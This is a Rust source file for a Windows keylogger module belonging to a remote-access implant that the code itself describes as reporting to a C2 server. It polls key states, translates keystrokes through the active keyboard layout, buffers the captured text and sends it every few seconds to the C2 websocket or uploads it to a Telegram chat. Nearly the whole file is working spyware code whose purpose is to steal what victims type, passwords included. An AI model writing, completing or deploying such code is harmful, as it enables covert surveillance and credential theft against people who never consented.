//! Keystroke capture via `GetAsyncKeyState` polling. No global hook, no
//! message loop, no injected DLL — just edge-detected polling of the async
//! key state, translated through the active keyboard layout with `ToUnicodeEx`.
//!
//! Text is buffered and flushed to the current C2 socket every ~3 s as
//! `{"t":"keys","text":"..."}`. The sink is swapped on every reconnect.
#![cfg(windows)]

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant};

use serde_json::json;
use tokio::sync::mpsc;
use tokio_tungstenite::tungstenite::Message;

use windows::Win32::UI::Input::KeyboardAndMouse::{
    GetAsyncKeyState, GetKeyboardLayout, MapVirtualKeyW, ToUnicodeEx, MAPVK_VK_TO_VSC, VK_CAPITAL,
    VK_CONTROL, VK_MENU, VK_SHIFT,
};

static ENABLED: AtomicBool = AtomicBool::new(false);
static STARTED: AtomicBool = AtomicBool::new(false);
static TELEGRAM: AtomicBool = AtomicBool::new(false);
static BUF: OnceLock<Mutex<String>> = OnceLock::new();
static SINK: OnceLock<Mutex<Option<mpsc::Sender<Message>>>> = OnceLock::new();

fn buf() -> &'static Mutex<String> {
    BUF.get_or_init(|| Mutex::new(String::new()))
}

fn sink() -> &'static Mutex<Option<mpsc::Sender<Message>>> {
    SINK.get_or_init(|| Mutex::new(None))
}

/// Point the keylogger at the current connection's writer channel.
pub fn set_sink(tx: mpsc::Sender<Message>) {
    *sink().lock().unwrap() = Some(tx);
}

pub fn enabled() -> bool {
    ENABLED.load(Ordering::Relaxed)
}

/// In Telegram-only mode the captured text is uploaded instead of streamed to
/// the C2 socket.
pub fn set_telegram(on: bool) {
    TELEGRAM.store(on, Ordering::Relaxed);
}

pub fn set_enabled(on: bool) {
    ENABLED.store(on, Ordering::Relaxed);
    if on {
        ensure_started();
    }
}

/// Take everything captured since the last call.
pub fn drain() -> String {
    let Ok(mut b) = buf().lock() else {
        return String::new();
    };
    std::mem::take(&mut *b)
}

fn ensure_started() {
    if STARTED.swap(true, Ordering::SeqCst) {
        return;
    }
    std::thread::spawn(poll_loop);
}

fn poll_loop() {
    let mut prev = [false; 256];
    let mut last_flush = Instant::now();
    loop {
        if !enabled() {
            prev = [false; 256];
            std::thread::sleep(Duration::from_millis(200));
            last_flush = Instant::now();
            continue;
        }
        for vk in 8u16..=254 {
            let down = unsafe { (GetAsyncKeyState(vk as i32) as u16) & 0x8000 != 0 };
            if down && !prev[vk as usize] {
                if let Some(s) = translate(vk) {
                    if let Ok(mut b) = buf().lock() {
                        b.push_str(&s);
                        if b.len() > 256 * 1024 {
                            let mut idx = b.len() - 128 * 1024;
                            while idx < b.len() && !b.is_char_boundary(idx) {
                                idx += 1;
                            }
                            let tail = b.split_off(idx);
                            *b = tail;
                        }
                    }
                }
            }
            prev[vk as usize] = down;
        }
        if last_flush.elapsed() >= Duration::from_secs(3) {
            flush();
            last_flush = Instant::now();
        }
        std::thread::sleep(Duration::from_millis(15));
    }
}

fn flush() {
    let text = drain();
    if text.is_empty() {
        return;
    }
    if TELEGRAM.load(Ordering::Relaxed) {
        // Network calls are blocking; keep the polling thread responsive.
        std::thread::spawn(move || {
            if let Some(chat) = crate::telegram::chat_id() {
                if text.chars().count() > 3500 {
                    let _ =
                        crate::telegram::send_bytes_document(&chat, "keys.txt", text.as_bytes(), "keys");
                } else {
                    let _ = crate::telegram::send_text_to(&chat, &text);
                }
            }
        });
        return;
    }
    let msg = Message::Text(json!({"t":"keys","text":text}).to_string());
    if let Ok(guard) = sink().lock() {
        if let Some(tx) = guard.as_ref() {
            let _ = tx.try_send(msg);
        }
    }
}

fn translate(vk: u16) -> Option<String> {
    let s = match vk {
        // Modifiers produce no text.
        0x10 | 0xA0 | 0xA1 | 0x11 | 0xA2 | 0xA3 | 0x12 | 0xA4 | 0xA5 => return None,
        // Lock toggles.
        0x14 | 0x90 | 0x91 => return None,
        0x08 => "[BKSP]".to_string(),
        0x09 => "[TAB]".to_string(),
        0x0D => "[ENTER]\n".to_string(),
        0x1B => "[ESC]".to_string(),
        0x20 => " ".to_string(),
        0x25 => "[LEFT]".to_string(),
        0x26 => "[UP]".to_string(),
        0x27 => "[RIGHT]".to_string(),
        0x28 => "[DOWN]".to_string(),
        0x2D => "[INS]".to_string(),
        0x2E => "[DEL]".to_string(),
        0x24 => "[HOME]".to_string(),
        0x23 => "[END]".to_string(),
        0x21 => "[PGUP]".to_string(),
        0x22 => "[PGDN]".to_string(),
        0x70..=0x87 => format!("[F{}]", vk - 0x6F),
        _ => {
            if let Some(ch) = unicode(vk) {
                ch
            } else {
                format!("[VK_{vk:02X}]")
            }
        }
    };
    Some(s)
}

fn unicode(vk: u16) -> Option<String> {
    unsafe {
        let mut state = [0u8; 256];
        if key_down(VK_SHIFT.0) {
            state[VK_SHIFT.0 as usize] = 0x80;
        }
        if key_down(VK_CONTROL.0) {
            state[VK_CONTROL.0 as usize] = 0x80;
        }
        if key_down(VK_MENU.0) {
            state[VK_MENU.0 as usize] = 0x80;
        }
        if (GetAsyncKeyState(VK_CAPITAL.0 as i32) as u16) & 0x0001 != 0 {
            state[VK_CAPITAL.0 as usize] = 0x01;
        }
        let scan = MapVirtualKeyW(vk as u32, MAPVK_VK_TO_VSC);
        let mut out = [0u16; 8];
        let hkl = GetKeyboardLayout(0);
        let n = ToUnicodeEx(vk as u32, scan, &state, &mut out, 0, hkl);
        if n > 0 {
            Some(String::from_utf16_lossy(&out[..n as usize]))
        } else {
            None
        }
    }
}

fn key_down(vk: u16) -> bool {
    unsafe { (GetAsyncKeyState(vk as i32) as u16) & 0x8000 != 0 }
}
